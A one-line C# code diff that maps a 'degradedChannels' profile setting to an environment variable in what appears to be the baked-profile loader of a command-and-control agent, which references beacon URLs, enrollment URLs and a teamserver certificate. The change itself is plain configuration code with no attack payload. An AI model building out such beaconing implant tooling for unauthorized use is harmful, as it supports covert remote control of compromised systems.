@@ -281,6 +281,7 @@ internal static class BakedProfileSupport
         SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
         SetEnvIfPresent(root, "verbs", "ROD_VERBS");
         SetEnvIfPresent(root, "mode", "ROD_MODE");
+        SetEnvIfPresent(root, "degradedChannels", "ROD_DEGRADED_CHANNELS");
         SetEnvIfPresent(root, "beaconURL", "ROD_BEACON_URL");
         // The pinned teamserver CA rides as the PEM text itself; the loader
         // accepts inline PEM or a file path under the same knob.
